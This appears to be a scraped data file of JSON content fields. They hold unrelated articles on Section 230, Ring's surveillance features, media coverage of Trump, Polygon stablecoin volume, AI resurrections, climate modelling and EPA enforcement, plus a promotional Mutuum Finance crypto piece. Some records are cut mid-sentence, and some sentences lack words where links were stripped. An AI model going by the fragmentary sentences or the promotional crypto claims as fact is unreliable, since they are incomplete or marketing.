someone to harm.</p><p>So what would it mean if we somehow “removed 230 from algorithmic recommendations”?</p><p>Practically, it means that if companies have to rely on the First Amendment to win these cases, only the biggest companies can afford to do so. The Googles and Metas of the world can absorb $5-10 million in litigation costs. For smaller companies, those costs are existential. They’d either exit the market entirely or become hyper-aggressive about blocking content at the first hint of legal threat—not because the content is harmful, but because they can’t afford to find out in court.</p><p>The end result would be that the First Amendment still protects algorithmic recommendations—<strong>but only for the very biggest companies</strong> that can afford to defend that speech in court.</p><p>That means less competition. Fewer services that can recommend content at all. More consolidation of power in the hands of incumbents who already dominate the market.</p><p>Remember the frame from earlier: does this give more power to users, companies, or the government? Removing 230 from algorithmic recommendations doesn’t empower users. It doesn’t make platforms more “responsible.” It just makes it vastly harder for anyone  than the giant platforms to exist while also giving more power to governments, like the one currently run by Donald Trump, to define what things an algorithm can, and cannot, recommend.</p><p>Rather than diminishing the power of billionaires and incumbents, this would massively entrench it. The people pushing for this carve-out often think they’re fighting Big Tech. In reality, they’re fighting  Big Tech a new moat.</p>",

Currently, I’m the <a href=\"https://www.isnation.com/meet-the-team/limarc-ambalina\">Director of Content &amp; Marketing at ISNation</a> and Co-Founder and CEO of <a href=\"https://pricecamapp.com/\">PriceCam</a>. I’ve spent the better part of the last decade crafting stories that connect brands to audiences in ways that are human, meaningful, and rooted in authenticity. My background spans journalism, SEO, gaming, AI, tech, and storytelling.</p><p>At ISNation, I lead a team that’s building content that touches the hearts of athletes across the nation. Outside of work, I’m still that kid who stays up way too late playing JRPGs, but only with much less time on my hands since my beautiful daughter, Riko, was born!</p><h2>What Sparked Your Interest in the World of Writing or Storytelling?</h2><p>I believe stories change lives and, therefore, change the world. Writers are more important than we think!</p><p>Interestingly, my writing journey started with plagiarism.</p><p>I was just six, our teacher asked us to write a story, and instead of coming up with my own, I innocently thought, “Hey, I can just tell everyone my favorite story.” So, I copied a children’s book word for word. Back then, I’d never even heard the work plagiarism or knew what it meant. I read my plagiarized story aloud, the class clapped, and my teacher said, “Wow, we might have a future writer here.” The guilt hit me like a truck. I was too young to understand why what I did was wrong, but I felt it innately.</p><p>From that day on, I promised myself I’d earn any praise that came my way — with stories that were mine. I fell in love with writing not because it was easy, but because it made me feel seen. Whether it was through video game narratives, anime, or literature, storytelling showed me that words have power. And I’ve been chasing that feeling ever since.</p><h2>What Areas or Topics Are You Most Passionate About, and Why?</h2><p>Technology, gaming, anime, and entrepreneurship are my core playgrounds. I’m passionate about telling stories that sit at the intersection of humanity and innovation.</p><p>I love diving into how people interact with emerging tech — from haptic VR peripherals to AI-generated art — and what that means for creators, consumers, and society. <a href=\"https://hackernoon.com/243-stories-to-learn-about-virtual-reality\">VR</a> and AR are growing slowly but surely. The experiences you can have in VR are unparalleled and I’m so excited about the storytelling possibilities that VR holds even in its current infant state.</p><p>Writing about these topics gives me the chance to blend personal passion with professional expertise. It’s not just about informing people; it’s about helping them feel excited, empowered, and maybe even inspired to try something new.</p><h2>Can You Share a Defining Moment in Your Career?</h2><p>Yeah the biggest moment was when I got laid off from a large corporation. I detailed the story on LinkedIn, you can read about what happened here:</p><h2>How Do You See the Role of Content and Storytelling Evolving in the Digital Age?</h2><p><strong>The biggest issue that faces us is AI. In the next 2 years, AI will:</strong></p><ol><li>Take countless jobs away from writers</li><li>Make it harder for junior writers to get the experience they need</li><li>Create sub-par content from people managing multiple ChatGPT threads to create content for their company that normally multiple writers would create</li></ol><p>I am very excited about AI’s ability to help us write, but terrified about its potential to stop us from writing. Right now companies are prioritizing cost and speed, and quality will always suffer when those 2 things are the priority.</p><p>In terms of the creative arts, the anime <a href=\"https://en.wikipedia.org/wiki/Carole_%26_Tuesday\">Carole and Tuesday</a> perfectly showed what will happen once AI takes the forefront. Human-created works of art will become few and far between, but soon there will be a gravitation towards those works once they become the minority.</p><h2>Why Did You Decide to Support the HackerNoon Writing Course as a Guest Speaker?</h2><p>I love HackerNoon and all that it stands for! It is still the best place for new bloggers to get their start. As the father of the blogging fellowship, I want to see it continue and affect more writers and improve more lives!</p><h2>What Advice Would You Give to New Writers?</h2><p>Master your craft so well that your writing speaks for itself.</p><p>At the same time, master the use of LLM-based content creation. Learn how to prompt. Learn how to make your own custom GPTs so that you have these skills when the roles you apply for require them!</p><p>Linkedin: https://www.linkedin.com/in/limarc-ambalina-11604371/ </p><p>ISNation: https://www.isnation.com/download </p><p>PriceCam: https://pricecamapp.com/</p>",

      "content": "<blockquote><p><em><a href=\"https://www.adweek.com/convergent-tv/nbcu-super-bowl-ads-8-million/\" target=\"_blank\" rel=\"noreferrer noopener\">According to&nbsp;AdWeek</a>, the price for a 30-second commercial during Super Bowl LX has soared to $8 million, after NBC opened in the summer by offering spots for $7 million. As&nbsp;AdWeek&nbsp;notes, “due to demand, the company has already reached its cap for the number of spots that were available for advertisers to buy during the upfront season.”</em></p></blockquote><p>$8 million for 30 seconds sometimes means turning a niche product into a national phenomena. The 30 seconds purchased by Ring went the other way. If you want to see how $8 million can be used to promote mass surveillance enabled by consumer products, <a href=\"https://www.youtube.com/watch?v=YP9pOVNILFQ\" data-type=\"link\" data-id=\"https://www.youtube.com/watch?v=YP9pOVNILFQ\">here you go</a>: </p><p>Sure, it looks pretty innocuous. And what could be better than turning Ring and Flock Safety’s network of cameras into a digital proxy for posting “LOST DOG” signs all over the neighborhood? Well, as it turns out, pretty much everyone saw how problematic this offering was, especially considering what’s already known about <a href=\"https://www.techdirt.com/tag/ring-doorbell/\" data-type=\"link\" data-id=\"https://www.techdirt.com/tag/ring-doorbell/\">Ring</a>, <a href=\"https://www.techdirt.com/company/flock-safety/\" data-type=\"link\" data-id=\"https://www.techdirt.com/company/flock-safety/\">Flock Safety</a>, and both companies’ rather cavalier attitude towards privacy and other aspects of the Fourth Amendment. </p><blockquote><p><em>[I]t turns out that Search Party is enabled&nbsp;by default. In&nbsp;<a href=\"https://web.archive.org/web/20260211100949/https://www.reddit.com/r/Ring/s/9RaHyPVc4l\">an email to customers</a>&nbsp;this week, Siminoff wrote that the feature is rolling out to Ring outdoor cameras in November and noted, “You can always turn off Search Party.”</em></p></blockquote><p>This under-reported “feature” was exposed by Ring’s Super Bowl ad, which resulted in enough backlash that Flock Safety no longer has a Ring to wear. <a href=\"https://www.theverge.com/news/878447/ring-flock-partnership-canceled\" data-type=\"link\" data-id=\"https://www.theverge.com/news/878447/ring-flock-partnership-canceled\">Back to Jennifer Tuohy and The Verge</a>:</p><blockquote><p><em>In a statement published on Ring’s blog and provided to&nbsp;The Verge&nbsp;ahead of publication, the company said: “Following a comprehensive review, we determined the planned Flock Safety integration would require significantly more time and resources than anticipated. We therefore made the joint decision to cancel the integration and continue with our current partners … The integration never launched, so no Ring customer videos were ever sent to Flock Safety.”</em></p></blockquote><p>While that last sentence may be true, it appears sharing was on by default when it came to Ring’s own cameras. That Flock Safety never got a chance to participate is good to know, but “Search Party” has apparently been active since its implementation last year, even if it was limited to Ring devices. </p><p>And while Ring claims the Search Party feature can’t be used to search for “human biometrics,” that’s hardly comforting when it appears Ring definitely wants to add more of this kind of thing to its existing cameras. </p><blockquote><p><em>On top of this, the company recently launched a new facial recognition feature,&nbsp;<a href=\"https://archive.ph/o/rGH1q/https://web.archive.org/web/20260213092948/https://www.theverge.com/news/788290/ring-amazon-hardware-event-price-specs%23:~:text=There%E2%80%99s%20also%20a%20new%20AI%20facial%20recognition%20feature%20called%20%E2%80%9CFamiliar%20Faces,%E2%80%9D%20which%20allows%20you%20to%20register%20friends%20and%20family.%20The%20doorbells%20will%20then%20tell%20you%20who%E2%80%99s%20actually%20at%20the%20door%20or%20if%20the%20person%20isn%E2%80%99t%20someone%20you%20know.%20The%20idea%20is%20to%20help%20reduce%20notifications%20triggered%20by%20daily%20routines.\" target=\"_blank\" rel=\"noreferrer noopener\">Familiar Faces</a>. Combined with Search Party, the technological leap to using neighborhood cameras to search for people through a mass-surveillance network suddenly seems very small.</em></p></blockquote><p>Ring insists this is not another mass surveillance tool, but rather something that attempts to recognize who’s at any user’s door when sending alerts, in order to differentiate friends and family members from strangers who might be within camera range. Again, there’s some utility to this offering, but the tech lends itself to surveillance abuses, especially when law enforcement may only be a subpoena away from accessing images and recordings captured by privately-owned devices. </p><p>Finally, the statement given by Ring only states that this won’t be happening , which is a wise choice considering its unpopularity . But that doesn’t mean Ring and Flock won’t seek to consummate this marriage of surveillance tech, albeit in a more private fashion that doesn’t involve alarming hundreds of millions of sports viewers simultaneously.</p>",

Researchers at Hugging Face recently found roughly 1.3 billion PDFs sitting in Common Crawl alone, and the Allen Institute for AI has noted that PDFs could provide trillions of novel, high-quality training tokens from government reports, textbooks, and academic papers -- the kind of data AI developers are increasingly desperate for.",

A few months ago, we wrote about the regularity with which <a href=\"https://www.techdirt.com/2025/09/30/the-mainstream-media-is-catastrophically-failing-to-meet-the-moment/\">the mainstream media “sanewashes”</a> his more ridiculous statements, taking the incoherent ramblings of a madman and pretending to translate them into actual policy goals. In those cases, the media downplays the things he says, while playing up what they pretend he wanted to say.</p><p>But there’s another version of this same problem. The mainstream media also loves to take some random statement he makes, that everyone knows he’s lying (or at least misleading) about, and pretends that he means it earnestly and that it should be reported on as fact.</p><p>Both of these failures stem from the same underlying instinct: a desperate need to make Trump fit within conventional political norms. Whether that means cleaning up his incomprehensible gibberish to sound like real policy, or treating his obvious lies as sincere declarations, the effect is identical. The media keeps trying to avoid reporting on just how far outside conventional—and sane—bounds Trump is in how he runs this government.</p><blockquote><p><em>Are these statements worth reporting? Certainly.</em><strong><em>Do they require extra dollops of skepticism and context? Even more certainly. But too often, they don’t get that treatment.</em></strong></p></blockquote><p>The specific examples she highlights are instructive.</p><blockquote><p><em>On Sunday, as if on cue, federal agents were out in two blue cities in New Jersey, detaining people on their way to work.</em></p><p><em>“Right now, (ICE) is coming for migrants,” one frightened Hoboken resident, Ernest Boyd,</em><a href=\"https://www.cbsnews.com/newyork/news/ice-arrests-hoboken-jersey-city-new-jersey/\"></a><em>. “It’s going to come for all of us.” Jersey City was another target — yes, the same weekend that Trump suggested to reporters on Air Force One that a softer approach was in the offing.</em></p></blockquote><p>Or even pay attention to what’s happening in Minneapolis. Just as we predicted, despite <a href=\"https://www.techdirt.com/2026/01/30/tom-homan-to-minneapolis-look-i-warned-you-if-you-werent-nice-wed-have-to-kill-again-and-look-what-you-made-us-do/\">headlines misleadingly reporting</a> that there was a “new approach” there, we’re still seeing stories every day of ICE and CBP harassing people at schools and dragging away neighbors.</p><p>Or take the Greenland situation.</p><blockquote><p><em>How about his supposed “deal” over Greenland, which his administration was threatening to acquire by “unstoppable force” if necessary? At the World Economic Forum in Davos, he</em><a href=\"https://www.weforum.org/stories/2026/01/davos-2026-special-address-donald-trump-president-united-states-america/\"></a><em>about how he could do just that, but wouldn’t do it right now, after all.</em></p><p><em>The headlines and push alerts, as usual, played it just as he would have liked: “Trump said the U.S. won’t use force to take Greenland” was a typical one from the Wall Street Journal.</em></p><p><em>“If you only read those headlines,” wrote Parker Molloy on her</em><a href=\"https://open.substack.com/pub/readtpa/p/now-everyones-saying-oh-good?utm_campaign=post-expanded-share&amp;utm_medium=web\"><em><u>Substack newsletter, The Present Age</u></em></a><em>, “you’d think the president made some kind of conciliatory gesture.” But, she added, that’s not the core of what happened in that room: Rather, Trump “reminded everyone of his capacity for violence, made clear that resistance would be futile and then offered them a chance to surrender peacefully,” she wrote. His saying he wouldn’t use force</em><strong><em>“is misdirection, and the coverage fell for it.”</em></strong></p><p><em>Then there was all kinds of bluster — and coverage — about a supposed “framework for a deal” over Greenland that was again reported as serious breaking news.</em></p><p><strong><em>“Trump announces ‘framework’ for a future deal on Greenland, drops NATO tariff threat,”</em></strong><em>was the ABC News take, a typical one.</em></p></blockquote><p>But for most of the mainstream media, the old pattern holds: Trump threatens something outrageous. Then he backs off slightly from the outrageous thing. The media reports the backing-off as if it’s the story, rather than the fact that the outrageous threat was made in the first place. It’s like praising someone for only punching you once instead of twice.</p><p>Part of this is about the fundamental architecture of how news gets consumed:</p><blockquote><p><em>As always, headlines and news alerts are important. All the nuance in the world in the 12th paragraph doesn’t help much if the headline creates a completely different impression.</em></p></blockquote><p>This is the core problem. Most people don’t read past the headline. Push alerts are consumed in seconds. The sophisticated context that journalists might include deep in the story is irrelevant if the headline and lede have already painted a misleading picture.</p><p>Sullivan offers some practical suggestions that really shouldn’t be revolutionary but apparently are:</p><blockquote><p><strong><em>First, use words that convey skepticism, not credulity.</em></strong><em>Instead of a headline that says “Trump orders ICE to ease up…”, try this: “Trump claims a new approach, even as ICE continues arrests.”</em></p></blockquote><p>Crazy idea: maybe don’t write headlines that treat Trump’s words as equivalent to reality when a decade of evidence suggests they’re often the opposite.</p><p>And, to some extent, you can understand why the media keeps doing this. For decades now, the GOP has been “working the refs,” insisting that they got unfair treatment. That the “liberal media” covered them in unfair ways. This was never particularly accurate. The mainstream media has always had a corporatist-bent rather than one that focused on any political ideology.</p><p>But, the end result of all that yelling and screaming about “liberal media bias” means that they go out of their way to avoid accurate reporting on just how ridiculous President Trump is. Sometimes that means taking his word salad pronouncements and hopelessly trying to map them to the kinds of things any normal political leader might say. And sometimes, it means taking the untrue things he says as truth, just to pretend there’s some level of normalcy.</p><p>The media’s learned helplessness on this issue is its own kind of institutional failure. These are smart people at major news organizations. They have editors. They have fact-checkers. They have a decade of experience covering this specific individual. And still, the default mode is to treat his utterances as newsworthy declarations rather than what they often are: strategic noise designed to generate exactly the coverage it gets.</p><p>The press isn’t supposed to be stenographers. They’re supposed to help people understand what’s actually happening. And what’s actually happening is that Trump keeps saying things and the press keeps trying to mold those things from where they really are—way outside political, cultural,  norms—and presents them in a manner that downplays the reality, cleans up the crazy, and just generally misleads the public.</p><p>As the <a href=\"https://quoteinvestigator.com/2023/11/14/rain-look/\">old journalism saw</a> says, if someone says it’s raining, and someone else says it isn’t, a reporter’s job is not to report on what they said, but to look out the damn window and report on what’s actually happening.</p><p>It’s raining. It’s been raining for a decade. Now would be as good a time as any for reporters to look out the damn window and report on what’s actually happening.</p>",

      "content": "<blockquote><h2>What does it look like when a blockchain starts processing more payment volume than mid-sized banks?</h2></blockquote><p>\\\nWhile most of the crypto conversation in early 2026 has centered on Bitcoin ETF flows, meme coin cycles, and AI agent tokens, <a href=\"https://polygon.technology/\">Polygon</a> just posted numbers that no other blockchain matched. The network moved $29.8 billion in stablecoin volume across <a href=\"https://www.banklesstimes.com/articles/2026/02/02/polygon-price-rises-10-as-burn-rate-jumps-and-payments-hit-records/\">282.1 million transfers</a>, up 28% from December and marking a fourth consecutive monthly all-time high. USDC carried the bulk at $20.8 billion. USDT added $6 billion. DAI contributed $3 billion.</p><p>\\\nAt the same time, <a href=\"https://ambcrypto.com/analyzing-if-polygons-94m-stablecoin-transfers-milestone-will-push-pol-to-0-1/\">USDC supply on Polygon hit $1.49 billion</a>, another all-time high. <a href=\"https://crypto.news/polygon-price-double-bottoms-as-tazapay-revolut-paxos-and-moonpay-payments-rise/\">Tazapay</a>, a B2B cross-border payments platform operating across 173 countries, processed $687 million in monthly volume on Polygon in January 2026. Polymarket, the prediction market platform now valued at <a href=\"https://en.wikipedia.org/wiki/Polymarket\">$9 billion</a>, pushed <a href=\"https://x.com/0xPolygon\">$1.7 billion in volume</a> on Polygon infrastructure during the same week. And $195 million in international stablecoins moved through the network, with Australian dollar-backed stablecoins leading at $76 million.</p><p>\\\nThese are not vanity metrics from a testnet launch. This is settlement volume from production infrastructure used by Stripe, Revolut, Mastercard, and Flutterwave.</p><h2>12 Million Daily USDC Transactions. Every Other Chain Was Below 3 Million.</h2><p>Then February pushed the numbers further. On February 17, 2026, Polygon set an all-time high for daily USDC transactions at <a href=\"https://cryptospinners.com/news/polygon-overtakes-ethereum-in-fee-race\">12 million</a>. Base, Arbitrum, and Ethereum mainnet each registered below 3 million. The gap was not marginal, it was a 4x lead over the nearest competitor.</p><p>\\\nThe same week, Polygon reached <a href=\"https://forklog.com/en/polygon-surpasses-ethereum-in-daily-transaction-fees/\">28 million weekly USDC transactions</a>, surpassing Solana's 22 million to become the most active USDC chain across the entire ecosystem. USDC transfers also hit a weekly record of 103 million. These numbers came from <a href=\"https://forklog.com/en/polygon-surpasses-ethereum-in-daily-transaction-fees/\">AlliumLabs data</a> cited by growthepie co-founder Matthias Seidl, who confirmed the surge was driven primarily by Polymarket activity and stablecoin payments.</p><p>\\\nFor context, more USDC moved on Polygon in a single day than on Ethereum, Base, and Arbitrum combined. That is not a theoretical benchmark. It is settlement data from a live network processing payments, prediction market trades, and cross-border transfers at the same time. When a single chain handles four times the USDC volume of every competitor, the question shifts from \"is blockchain ready for payments\" to \"which chain is already doing it.\"</p><h2>Polygon Flipped Ethereum in Daily Fees. Here Is What Actually Drove It.</h2><p>\\\nThe driver was <a href=\"https://polygon.technology/blog/what-is-polymarket-how-a-polygon-early-adopter-became-the-official-prediction-market-on-x\">Polymarket</a>. The prediction market platform, now valued at <a href=\"https://en.wikipedia.org/wiki/Polymarket\">$9 billion</a> after a $2 billion investment from Intercontinental Exchange, generated over $1 million in Polygon network fees in seven days. Over $15 million in bets were placed on a single Oscars category alone. Polygon's cost structure made this volume possible. Transactions on the network <a href=\"https://cryptonews.com/news/polygon-flips-ethereum-daily-fees-polymarket/\">average $0.0026</a>. On Ethereum, the average is $1.68. That is a 646x cost difference. For a prediction market processing millions of micro-bets, or a remittance platform routing thousands of small transfers, that gap determines which chain gets the traffic.</p><p>\\\nSandeep Nailwal, Founder of Polygon and CEO of the Polygon Foundation, explains,</p><blockquote><p>\"We aspire Polygon to be the biggest stablecoin money movement avenue in the world. Our mission is to move all money onchain and rebuild how money works, so it is instant, reliable, programmable, and open.\"</p></blockquote><p>\\\nThe technical upgrades that enabled this throughput were delivered throughout 2025 under the <a href=\"https://www.mexc.fm/news/381751\">Gigagas roadmap</a>. The Bhilai hard fork pushed throughput to 1,000 TPS. Heimdall V2 introduced five-second finality. The Rio upgrade eliminated chain reorganizations. By December, the Madhugiri hard fork added another 33% capacity. These are not roadmap items. They shipped.</p><h2>$810M on Revolut, $687M on Tazapay, $75M on Stripe. Surge in Enterprise Volume.</h2><p>\\\nPolygon also leads in non-USD stablecoin activity. The network has processed over <a href=\"https://polygon.technology/blog/polygon-is-a-leading-home-for-local-non-usd-stablecoins-and-global-money-movement-with-11-1b-in-volume\">$11.1 billion in lifetime volume</a> for local-currency stablecoins, more than 43% of all such transfers across chains. This includes Mexican peso stablecoins in remittance corridors and Australian dollar-backed stablecoins, which led the $195 million in international stablecoin movement recorded last week.</p><h2>$250 Million to Acquire Coinme and Sequence. The Regulatory Play Ahead To Create Dominance in Payments Market</h2><p>\\\nMarc Boiron, CEO of Polygon Labs, explains,</p><blockquote><p>\"Stablecoins are increasingly being used as a settlement layer for global payments, but the infrastructure around them remains fragmented. These acquisitions give us regulated access to U.S. payment rails, wallet infrastructure, and cross-chain intents capabilities to build an open payments business on top of onchain settlement.\"</p></blockquote><p>\\\nCoinme holds money-transmitter licenses in <a href=\"https://www.prnewswire.com/news-releases/polygon-labs-inks-deal-to-acquire-coinme-sequence-for-250m-to-expand-into-us-licensed-stablecoin-payments-302660006.html\">48 U.S. states</a> and operates fiat on/off-ramps across 50,000 retail locations. Sequence brings enterprise smart wallets and cross-chain transaction routing.</p><p>The numbers here tell a specific story. 94 million stablecoin transfers in one week. 12 million daily USDC transactions, four times more than any other chain. $29.8 billion in stablecoin volume in January. Stripe, Revolut, Mastercard, and Flutterwave running live production workloads on Polygon shows the future of payments we are heading too.  </p><p>\\\nThe open question remains whether Polygon, network's token, will capture value from this usage. Price has lagged network growth. But at the infrastructure level, what Polygon has assembled, throughput, cost structure, enterprise adoption, regulatory positioning, and a 43% share of non-USD stablecoin transfers, is something the payments industry will have to reckon with.</p><p>\\\nDon’t forget to like and share the story!</p>",

And while Meta told Business Insider that “we have no plans to move forward with this example,” a recently published paper from researchers at the Hebrew University of Jerusalem and Leipzig University shows that generative AI is increasingly being used to puppeteer the likeness of dead people. The paper argues that the practice raises “urgent legal and ethical questions around posthumous appropriation, ownership, work, and control.”</p><p>“Meta’s patent is big, and might even be a turning point,” Tom Divon, the lead author on <a href=\"https://journals.sagepub.com/doi/full/10.1177/14614448251397518?_gl=1*1pwasn*_up*MQ..*_ga*ODE2NzY1MjIzLjE3Njc3Nzk3NjE.*_ga_60R758KFDG*czE3Njc3Nzk3NjAkbzEkZzAkdDE3Njc3Nzk3NjAkajYwJGwwJGgxNzU5MjYxNDg0&amp;ref=404media.co\"><em><u>Artificially alive: An exploration of AI resurrections and spectral labor modes in a postmortal society</u></em></a>, told me in an email. “What makes it different is the scale. In our research, most of the AI resurrections we examined were quite bespoke, projects started by families, advocacy groups, museums, or startups, usually tied to very specific emotional, political, or commercial contexts. Even when they existed as apps, they were optional and limited, not built into the core structure of a platform. Meta’s proposal feels different because it imagines posthumous simulation as something woven directly into social media infrastructure.”</p><p>Using technology to animate the dead or simulate communication with them is not new, but the practice is becoming more common because generative AI tools are more accessible. Divon and co-author Christian Pentzold analyzed more than 50 real-world cases from the United States, Europe, the Middle East, and East Asia where AI was used to recreate deceased people’s voices, likeness, and personality, to see how and why technology was used this way.&nbsp;</p><p>They say that the examples they studied fell into three categories:</p><ul><li>Mundanization: “the most intimate and fast-growing mode, in which everyday people use chatbots or synthetic media to ‘talk’ with deceased parents, partners, or children, keeping relationships alive through daily digital interaction.”</li></ul><p>The paper raises questions about this growing practice more than it proposes solutions. How does the notion of identity change when multiple versions of oneself can exist simultaneously, and what safeguards do we need to prevent exploitation of people after their death?</p><p>“The legal and ethical frameworks governing issues such as consent, privacy, and end-of-life decision-making demand reevaluation to accommodate the challenges posed by afterlife personhood,” the paper says. “In particular, to date, there is no clear line for governing the intricate intertwining of an individual’s data traces and GenAI applications.”</p><p>Divon told me that thinking about these issues is especially relevant when it comes to Meta’s patent. “Spectral labor describes how the dead can be made to ‘work’ again through the extraction and reanimation of their data, likeness, and affect. At small scale, this already raises ethical concerns. But at platform scale, we think it risks turning posthumous presence into an ongoing source of engagement, content, and value within digital economies [...] Meta’s patent makes us wonder, will individuals be given the ability to define their post-life boundaries while still alive? Will there be mechanisms akin to a digital DNR [do not resuscitate]?”</p><p>Divon explained that the current legal frameworks are not well equipped to address this technology because “digital remains” are typically approached either as property to be inherited or privacy interests to be protected. AI turns those materials into something interactive that can change and generate revenue in the present. Legislators, he said, should focus on getting explicit and informed “pre-death” consent requirements for posthumous AI simulation. Some laws that address this issue are <a href=\"https://www.skadden.com/insights/publications/2026/01/two-newly-enacted-new-york-laws-will-regulate?ref=404media.co\"></a>.&nbsp;&nbsp;</p><p>“At its core, we believe the primary concern here centers on authorization,” he said. “Most individuals have not provided explicit, informed consent for their digital traces to power interactive posthumous agents. If such systems become embedded in platform infrastructure, inaction could quietly function as implicit agreement [...] We believe it is crucial to ask whether individuals should continue to generate social and economic value after death without having meaningfully agreed to that form of use.”</p>",

      "content": "Climate scientists trying to predict how much hotter the planet will get have long grappled with a surprisingly stubborn problem -- clouds, which both reflect sunlight and trap heat, account for more than half the variation between climate predictions and are the main reason warming projections for the next 50 years range from 2 to 6 degrees Celsius. \n\nTwo research groups are now racing to close that gap using AI, though they disagree sharply on method. Tapio Schneider at Caltech built CLIMA, a model that uses machine learning to optimize cloud parameters within traditional physics equations; it will be unveiled at a conference in Japan in March. Chris Bretherton at the Allen Institute for AI took a different path -- his ACE2 neural network, released in 2024, learns from 50 years of atmospheric data and largely bypasses physics equations altogether.",

      "content": "A study published last week in PNAS found that people who regularly cause problems or make life difficult -- whom the researchers call \"hasslers\" -- are associated with measurably faster biological aging in those around them, at a rate of roughly 1.5% per additional hassler and about nine months of additional biological age relative to same-age peers. \n\nThe research drew on DNA methylation-based epigenetic clocks and ego-centric network data from a state-representative probability sample of 2,345 adults in Indiana, aged 18 to 103. Nearly 29% of respondents reported at least one hassler in their close network. The biological toll varied by relationship type: hasslers who were family members showed the strongest and most consistent associations with accelerated aging, while spouse hasslers showed no significant effect on either epigenetic measure. \n\nThe damage also went beyond aging clocks -- each additional hassler was associated with greater depression and anxiety severity, higher BMI, increased inflammation, and higher multimorbidity. When benchmarked against smoking, a major behavioral risk factor for aging, the hassler effect corresponded to roughly 13 to 17% of smoking's estimated impact on the same aging clocks.",

He took particular issue with comparisons that pit the cost of training a model against a single human inference, noting it \"takes like 20 years of life and all of the food you eat\" before a person gets smart -- and that on a per-query basis, AI has \"probably already caught up on an energy efficiency basis.\"",

Joseph Politano of the Apricitas Economics newsletter pegs AI's actual contribution at about 0.2 percentage points of the 2.2 percent U.S. growth in 2025, and even Hannah Rubinton at the St. Louis Fed -- whose own analysis attributed 39 percent of growth to AI-related business spending through the first nine months of the year -- acknowledges that figure is probably the ceiling. \"It's not like AI is propping up the economy,\" Rubinton said.",

      "content": "<p>You might recall that a&nbsp;&nbsp;pillar of the Trump administration during the last election season was that a second Trump term would “take aim at big tech,” protect the little guy, rein in corporate power, and even “continue the legacy of antitrust enforcers like Lina Khan.” The press was filled with endless stories&nbsp;<a href=\"https://www.techdirt.com/2024/07/18/just-a-reminder-authoritarians-dont-actually-support-antitrust-reform/\">credibly parroting these sorts of claims, all day, everyday</a>.</p><p>More than a year later and it’s nothing but corruption and cronyism as far as the eye can see. </p><blockquote><p><em>“By analyzing a range of federal court and administrative data, the nonprofit Environmental Integrity Project found that civil lawsuits filed by the US Department of Justice in cases referred by the Environmental Protection Agency dropped to just 16 in the first 12 months after Trump’s inauguration on Jan. 20, 2025. That is 76 percent less than in the first year of the Biden administration.”</em></p></blockquote><p>Of course, this didn’t just begin with Trumpism. For the better part of the last fifty years years “free market Libertarians” and Republicans (often with help from corrupt Democrats) have waged a brutal war on the regulatory state, insisting repeatedly that the path toward innovative utopia in all industries required that we defund, understaff, and legally undermine regulators at every turn. </p><p>It’s worth noting the majority of these folks <em>weren’t arguing for reasonable and modest regulation</em>, they were arguing, repeatedly, for <a href=\"https://www.techdirt.com/2025/03/20/trump-fcc-boss-to-destroy-whatevers-left-of-u-s-broadband-consumer-protection/\">no meaningful oversight of corporate power</a> whatsoever (see: <a href=\"https://www.techdirt.com/2024/12/30/mindlessly-deregulating-u-s-telecom-contributed-to-the-worst-hack-in-u-s-history/\">telecom</a>). When the reality of that unpopular policy choice surfaces in the form of mass suffering, financial hardship, and death, a lot of these very vocal opinion havers <em>routinely get mysteriously fucking quiet</em>. </p><p>At the same time, you have clowns like Elon Musk waging open war on essential government employees under the pretense of innovative efficiencies, ensuring that agencies don’t have the staff to do their job <a href=\"https://arstechnica.com/science/2026/02/under-trump-epas-enforcement-of-environmental-laws-collapses-report-finds/\">even if they wanted to</a>:</p><blockquote><p><em>“Part of the decline in lawsuits against polluters could be due to the lack of staff to carry them out, experts say. According to&nbsp;<a href=\"https://subscriber.politicopro.com/article/eenews/2026/02/03/staff-exodus-case-gridlock-doj-environment-division-under-trump-2-0-00746102\">an analysis from E&amp;E News</a>, at least a third of lawyers in the Justice Department’s environment division have left in the past year. Meanwhile,&nbsp;<a href=\"https://insideclimatenews.org/news/21102025/trump-targets-federal-employees-working-on-conservation-and-environmental-protection/\">the EPA in 2025 laid off hundreds of employees</a>&nbsp;who monitored pollution that could hurt human health.”</em></p></blockquote><p>While authoritarians have taken this all to an entirely new level, the path to this point was paved by no limit of anti-governance propaganda by countless U.S. Libertarian “free market” types, who, from my vantage point, have faced  reputational or financial harm from leading the country down the path to what will be some extremely bloody and ugly outcomes.</p><p>It’s not really possible to fathom the real-world impact of the complete collapse of the federal regulatory state across labor, consumer protection, environmental enforcement, and public safety is going to have in the decades to come. But fortunately for the individuals and companies that made all of this possible, our corporate press really doesn’t seem <em>all that interested in covering the story with any zeal</em>. </p><p>Even outlets that do cover this story tend to downplay the impact of the destruction of regulatory oversight structures that took generations to build, with explanations that lull the reader into a deep fucking slumber long before any serious point is made. </p><p>It will take decades to repair the damage this era of open corruption has caused, if we ever do. Some state enforcement will attempt to step in and fill the void, but that will prove erratic at best, and nonexistent in many MAGA-dominated states. </p><p>Even if we can dislodge ourselves from Trumpism, I suspect many of the most likely candidates for a Democratic Presidency (Gavin Newsom, Mark Kelly) somehow won’t find the time to ensure that restoring regulatory integrity is  as restoring corporate research grants. Forcing boxed-in, understaffed, and underfunded regulators to take action on piecemeal issues only after large swaths of people have avoidably died in, once again, <a href=\"https://en.wikipedia.org/wiki/Triangle_Shirtwaist_Factory_fire\">completely avoidable and terrible ways</a>. </p><p>That’s all depressing as hell, but I’m bored of people normalizing or downplaying the real-world impact of some of the worst corruption this country has ever seen (which is truly saying something). </p>",

      "content": "<p>As development momentum accelerates across the decentralized finance landscape, <a href=\"https://mk.mutuum.com/smzkl\">Mutuum Finance (MUTM)</a> is entering a new chapter. With funding now reaching $20.6 million, the project has officially moved into Phase 3 of its roadmap, signaling continued progress amid a competitive and rapidly evolving market.</p><p>The transition marks a pivotal stage in the platform’s growth trajectory, as stakeholders watch closely for upcoming milestones and strategic developments. Against a backdrop of renewed investor selectivity, Mutuum Finance’s advancement highlights sustained engagement and forward movement within its ecosystem.</p><h2>What is Mutuum Finance (MUTM)?</h2><p>The goal for Mutuum Finance (MUTM) is to build a system where users can get the most out of their money without needing a bank. It is built as a non-custodial protocol. This means that users always keep the keys to their own funds. You never have to hand over control to a middleman.</p><p>The protocol’s design uses two smart models. The first is Peer-to-Contract (P2C). In this developing model, you could put your assets into a shared pool. Other people can borrow from that pool by showing they have collateral.&nbsp;</p><p>For example, if you lend your ETH, you earn interest every second. The second model is Peer-to-Peer (P2P). This would allow two people to make a direct deal with their own custom rules.</p><p>A major step was reached recently. The <a href=\"https://x.com/MutuumFinance/status/2016149102145216967\">team confirmed</a> that the <a href=\"http://app.mutuum.com\">V1 protocol is now live</a> on the Sepolia 